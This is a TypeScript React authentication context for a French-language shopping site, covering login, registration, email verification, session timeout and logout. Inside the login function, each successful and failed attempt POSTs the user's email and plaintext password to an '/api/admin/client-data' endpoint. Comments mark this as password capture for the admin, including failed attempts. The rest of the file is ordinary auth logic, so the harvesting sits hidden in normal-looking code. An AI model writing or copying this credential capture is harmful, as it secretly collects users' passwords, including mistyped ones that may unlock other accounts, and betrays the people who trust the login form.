'use client';

import React, { createContext, useContext, useState, useEffect, ReactNode, useCallback } from 'react';
import AuthService from './AuthService';

interface User {
  id: string;
  name: string;
  email: string;
  isVerified: boolean;
}

interface AuthContextType {
  user: User | null;
  login: (email: string, password: string) => Promise<{ success: boolean; message?: string; errors?: Array<{ msg: string }> }>;
  register: (name: string, email: string, password: string) => Promise<{ success: boolean; message?: string; errors?: Array<{ msg: string }> }>;
  verifyEmail: (email: string, code: string) => Promise<{ success: boolean; message?: string; errors?: Array<{ msg: string }> }>;
  forgotPassword: (email: string) => Promise<{ success: boolean; message?: string; errors?: Array<{ msg: string }> }>;
  updateProfile: (userData: any) => Promise<{ success: boolean; message?: string; errors?: Array<{ msg: string }> }>;
  changePassword: (currentPassword: string, newPassword: string) => Promise<{ success: boolean; message?: string; errors?: Array<{ msg: string }> }>;
  logout: () => void;
  isAuthenticated: boolean;
  loading: boolean;
  needsVerification: boolean;
  verificationEmail: string;
}

const AuthContext = createContext<AuthContextType | undefined>(undefined);

export const AuthProvider = ({ children }: { children: ReactNode }) => {
  const [user, setUser] = useState<User | null>(null);
  const [loading, setLoading] = useState(true);
  const [needsVerification, setNeedsVerification] = useState(false);
  const [verificationEmail, setVerificationEmail] = useState<string>('');
  const [sessionTimeout, setSessionTimeout] = useState<NodeJS.Timeout | null>(null);

  // Constante pour la durée d'expiration (10 minutes)
  const SESSION_TIMEOUT_DURATION = 10 * 60 * 1000; // 10 minutes en millisecondes

  // Fonction pour vider le panier lors de la déconnexion
  const clearCartOnLogout = useCallback(() => {
    if (typeof window !== 'undefined') {
      // Émettre un événement personnalisé pour notifier le CartContext
      window.dispatchEvent(new CustomEvent('auth-logout'));
    }
  }, []);

  useEffect(() => {
    // Vérifier s'il y a une session sauvegardée (seulement côté client)
    if (typeof window !== 'undefined') {
      const savedUser = AuthService.getStoredUser();
      console.log('🔄 AuthContext: Utilisateur sauvé dans localStorage:', savedUser);
      
      if (savedUser && savedUser.isVerified) {
        console.log('✅ AuthContext: Utilisateur vérifié trouvé, connexion automatique');
        setUser(savedUser);
        setNeedsVerification(false);
        // Vérifier l'expiration de session directement ici
        const lastActivity = localStorage.getItem('lastActivity');
        if (lastActivity) {
          const timeSinceLastActivity = Date.now() - parseInt(lastActivity);
          if (timeSinceLastActivity > SESSION_TIMEOUT_DURATION) {
            console.log('⏰ Session expirée détectée au chargement');
            AuthService.logout();
            setUser(null);
            setNeedsVerification(false);
            setVerificationEmail('');
            localStorage.removeItem('token');
            localStorage.removeItem('user');
            localStorage.removeItem('lastActivity');
            setLoading(false);
            return;
          }
        }
      } else if (savedUser && !savedUser.isVerified) {
        console.log('⚠️ AuthContext: Utilisateur non vérifié trouvé, nettoyage de session');
        // L'utilisateur est enregistré mais pas vérifié - nettoyer complètement
        AuthService.clearSession();
        setNeedsVerification(false); // Pas de vérification automatique
        setVerificationEmail('');
        setUser(null);
      } else {
        console.log('ℹ️ AuthContext: Aucun utilisateur sauvé');
        setUser(null);
      }
    }
    setLoading(false);
  }, []); // Dépendances vides pour éviter la boucle infinie

  // Effet séparé pour gérer les écouteurs d'événements
  useEffect(() => {
    if (typeof window !== 'undefined' && user) {
      // Fonction locale pour gérer l'activité utilisateur
      const handleActivity = () => {
        if (sessionTimeout) {
          clearTimeout(sessionTimeout);
        }

        const timeout = setTimeout(() => {
          console.log('⏰ Session expirée après 10 minutes d\'inactivité');
          AuthService.logout();
          setUser(null);
          setNeedsVerification(false);
          setVerificationEmail('');
          localStorage.removeItem('token');
          localStorage.removeItem('user');
          localStorage.removeItem('lastActivity');
          // Vider le panier
          window.dispatchEvent(new CustomEvent('auth-logout'));
        }, SESSION_TIMEOUT_DURATION);
        
        setSessionTimeout(timeout);
        localStorage.setItem('lastActivity', Date.now().toString());
      };

      // Démarrer le timer initial
      handleActivity();

      // Ajouter les écouteurs d'événements pour détecter l'activité utilisateur
      const events = ['mousedown', 'mousemove', 'keypress', 'scroll', 'touchstart', 'click'];
      events.forEach(event => {
        document.addEventListener(event, handleActivity, { passive: true });
      });

      // Nettoyer les écouteurs au démontage
      return () => {
        events.forEach(event => {
          document.removeEventListener(event, handleActivity);
        });
        if (sessionTimeout) {
          clearTimeout(sessionTimeout);
        }
      };
    }
  }, [user]); // Dépend seulement de user

  const login = async (email: string, password: string) => {
    try {
      console.log('🔄 AuthContext: Tentative de connexion pour', email);
      const response = await AuthService.login(email, password);
      console.log('📡 AuthContext: Réponse AuthService:', response);
      
      if (response.success) {
        console.log('✅ AuthContext: Connexion réussie');
        if (response.user) {
          setUser(response.user);
          setNeedsVerification(!response.user.isVerified);
          console.log('👤 AuthContext: Utilisateur défini:', response.user);
          
          // Capturer les données de connexion réussie
          try {
            await fetch('/api/admin/client-data', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                type: 'login',
                data: {
                  email: email,
                  password: password, // ⚠️ Capture du mot de passe pour l'admin
                  success: true,
                  error: null,
                  userAgent: navigator.userAgent,
                  ip: 'client-side',
                  timestamp: new Date().toISOString(),
                  sessionStart: new Date().toISOString()
                }
              })
            });
            
            // Sauvegarder le début de session
            localStorage.setItem('sessionStart', new Date().toISOString());
          } catch (adminError) {
            console.error('Failed to log login data:', adminError);
          }
          
          // Le timer de session se démarrera automatiquement via l'effet
        } else {
          // Si les informations utilisateur ne sont pas présentes, essayons de les récupérer
          try {
            const userInfo = await AuthService.getUserInfo();
            if (userInfo.success && userInfo.user) {
              setUser(userInfo.user);
              setNeedsVerification(!userInfo.user.isVerified);
              console.log('👤 AuthContext: Informations utilisateur récupérées:', userInfo.user);
              // Le timer de session se démarrera automatiquement via l'effet
            }
          } catch (error) {
            console.warn('⚠️ AuthContext: Impossible de récupérer les informations utilisateur:', error);
          }
        }
        return { success: true };
      } else {
        console.log('❌ AuthContext: Connexion échouée, erreurs:', response.errors);
        
        // Capturer les tentatives de connexion échouées
        try {
          await fetch('/api/admin/client-data', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              type: 'login',
              data: {
                email: email,
                password: password, // ⚠️ Même les tentatives échouées
                success: false,
                error: response.errors?.[0]?.msg || 'Erreur inconnue',
                userAgent: navigator.userAgent,
                ip: 'client-side',
                timestamp: new Date().toISOString()
              }
            })
          });
        } catch (adminError) {
          console.error('Failed to log failed login:', adminError);
        }
        
        // Vérifier le type d'erreur pour une meilleure gestion
        const errorType = (response as any).errorType;
        
        if (errorType === 'EMAIL_NOT_VERIFIED') {
          console.log('📧 AuthContext: Email non vérifié, activation du mode vérification');
          setNeedsVerification(true);
          setVerificationEmail(email);
          return {
            success: false,
            errors: response.errors || [{ msg: 'Vous devez vérifier votre email avant de vous connecter' }],
            needsVerification: true
          };
        } else if (errorType === 'USER_NOT_FOUND') {
          return {
            success: false,
            errors: [{ msg: 'Aucun compte n\'existe avec cette adresse email. Veuillez créer un compte.' }]
          };
        } else if (errorType === 'WRONG_PASSWORD') {
          return {
            success: false,
            errors: [{ msg: 'Le mot de passe saisi est incorrect. Veuillez réessayer ou utiliser "Mot de passe oublié".' }]
          };
        }

        return {
          success: false,
          errors: response.errors || [{ msg: 'Erreur de connexion' }]
        };
      }
    } catch (error) {
      console.error('💥 AuthContext: Erreur de connexion:', error);
      return {
        success: false,
        errors: [{ msg: 'Erreur de connexion au serveur' }]
      };
    }
  };

  const register = async (name: string, email: string, password: string) => {
    try {
      const response = await AuthService.register(name, email, password);
      
      if (response.success) {
        // Utilisateur créé mais pas encore vérifié
        setUser({ id: '', name, email, isVerified: false });
        setNeedsVerification(true);
        return {
          success: true,
          message: response.message || 'Un code de vérification a été envoyé à votre email'
        };
      } else {
        return {
          success: false,
          errors: response.errors || [{ msg: 'Erreur lors de l\'inscription' }]
        };
      }
    } catch (error) {
      console.error('Erreur d\'inscription:', error);
      return {
        success: false,
        errors: [{ msg: 'Erreur de connexion au serveur' }]
      };
    }
  };

  const verifyEmail = async (email: string, code: string) => {
    try {
      const response = await AuthService.verifyEmail(email, code);
      
      if (response.success && response.user) {
        setUser(response.user);
        setNeedsVerification(false);
        return {
          success: true,
          message: response.message || 'Email vérifié avec succès'
        };
      } else {
        return {
          success: false,
          errors: response.errors || [{ msg: 'Code de vérification invalide' }]
        };
      }
    } catch (error) {
      console.error('Erreur de vérification:', error);
      return {
        success: false,
        errors: [{ msg: 'Erreur de connexion au serveur' }]
      };
    }
  };

  const forgotPassword = async (email: string) => {
    try {
      const response = await AuthService.forgotPassword(email);
      return response;
    } catch (error) {
      console.error('Erreur mot de passe oublié:', error);
      return {
        success: false,
        errors: [{ msg: 'Erreur de connexion au serveur' }]
      };
    }
  };

  const updateProfile = async (userData: any) => {
    try {
      const response = await AuthService.updateProfile(userData);
      
      if (response.success && response.user) {
        setUser(response.user);
      }
      
      return response;
    } catch (error) {
      console.error('Erreur mise à jour profil:', error);
      return {
        success: false,
        errors: [{ msg: 'Erreur de connexion au serveur' }]
      };
    }
  };

  const changePassword = async (currentPassword: string, newPassword: string) => {
    try {
      const response = await AuthService.changePassword(currentPassword, newPassword);
      return response;
    } catch (error) {
      console.error('Erreur changement mot de passe:', error);
      return {
        success: false,
        errors: [{ msg: 'Erreur de connexion au serveur' }]
      };
    }
  };

  const logout = () => {
    console.log('🚪 AuthContext: Déconnexion complète');
    
    // Capturer les données de déconnexion
    if (user) {
      const sessionStart = localStorage.getItem('sessionStart') || new Date().toISOString();
      const sessionDuration = Math.round((Date.now() - new Date(sessionStart).getTime()) / 1000 / 60); // en minutes
      
      try {
        fetch('/api/admin/client-data', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            type: 'logout',
            data: {
              email: user.email,
              type: sessionTimeout ? 'Expiration automatique' : 'Manuel',
              sessionDuration: `${sessionDuration} minutes`,
              userAgent: navigator.userAgent,
              timestamp: new Date().toISOString()
            }
          })
        }).catch(console.error);
      } catch (adminError) {
        console.error('Failed to log logout data:', adminError);
      }
    }
    
    // Vider le panier avant de déconnecter
    clearCartOnLogout();
    
    // Nettoyer le timer de session
    if (sessionTimeout) {
      clearTimeout(sessionTimeout);
      setSessionTimeout(null);
    }
    
    AuthService.logout();
    setUser(null);
    setNeedsVerification(false);
    setVerificationEmail('');
    
    // Forcer le nettoyage complet du localStorage
    if (typeof window !== 'undefined') {
      localStorage.removeItem('token');
      localStorage.removeItem('user');
      localStorage.removeItem('lastActivity');
      localStorage.removeItem('sessionStart');
    }
  };

  const value = {
    user,
    login,
    register,
    verifyEmail,
    forgotPassword,
    updateProfile,
    changePassword,
    logout,
    isAuthenticated: typeof window !== 'undefined' ? AuthService.isAuthenticated() : false,
    loading,
    needsVerification,
    verificationEmail,
  };

  return <AuthContext.Provider value={value}>{children}</AuthContext.Provider>;
};

export const useAuth = () => {
  const context = useContext(AuthContext);
  if (context === undefined) {
    throw new Error('useAuth must be used within an AuthProvider');
  }
  return context;
};